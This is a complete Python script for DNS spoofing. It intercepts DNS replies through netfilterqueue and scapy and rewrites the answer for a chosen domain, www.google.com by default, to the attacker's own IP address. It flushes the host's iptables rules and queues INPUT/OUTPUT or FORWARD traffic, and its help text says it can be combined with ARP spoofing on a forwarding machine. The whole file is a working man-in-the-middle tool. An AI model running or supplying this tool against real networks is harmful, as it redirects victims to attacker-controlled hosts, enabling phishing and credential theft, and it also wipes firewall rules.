import netfilterqueue
from scapy.layers.inet import IP, UDP
from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dns import DNSRR, DNS, DNSQR
import argparse
import os

MY_IP = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
TARGET = 'www.google.com' #DEFAULT TARGET

class NoInterfaceSpecified(Exception):
    pass

class NoTargetSpecified(Exception):
    pass

#Process each packet
def process_packet(packet):
    IP_pkt = IP(packet.get_payload())

    #It's a DNS Response
    if(IP_pkt.haslayer(DNSRR)):
        #Name to be translated through DNS Query Record
        domain = IP_pkt[DNSQR].qname

        #DNS resolution response for TARGET domain
        if TARGET in str(domain):
            print("Spoofing target")
            answer = DNSRR(rrname=domain, rdata=MY_IP)
            IP_pkt[DNS].an = answer
            #Only 1 DNS record (only 1 IP related to target)
            IP_pkt[DNS].ancount = 1
            
            #Delete checksum, len of IP packet and UDP packet
            #(scapy then recalculate automatically them using inserted fields)
            del IP_pkt[IP].len
            del IP_pkt[IP].chksum
            del IP_pkt[UDP].len
            del IP_pkt[UDP].chksum

    packet.set_payload(bytes(IP_pkt))
    packet.accept()


#Parser of command line argument
def args_parser():
    global MY_IP, TARGET
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
    parser.add_argument("-interface", "-i", dest="interface", help="Name of the network interface of your machine")
    parser.add_argument("-target", "-target", dest="target", help="Target domain of DNS spoofing")

    #Parse command line arguments
    args = parser.parse_args()

    #Check if the name of the network interface and the target domain have been specified
    if args.interface:
        MY_IP = get_if_addr(args.interface)

    if args.target:
        TARGET = args.target

    return args.local


def main():
    local = args_parser()

    #Packets are blocked and not forwarded
    if local:
        os.system('iptables -F')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
    else:
        os.system('iptables -F')
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')


    #O = queue num
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)

    try:
        queue.run()
    except KeyboardInterrupt:
        queue.unbind()
        print('Flushing ip table.', end='\n\n')
        os.system('iptables -F')

if __name__=='__main__':
	main()
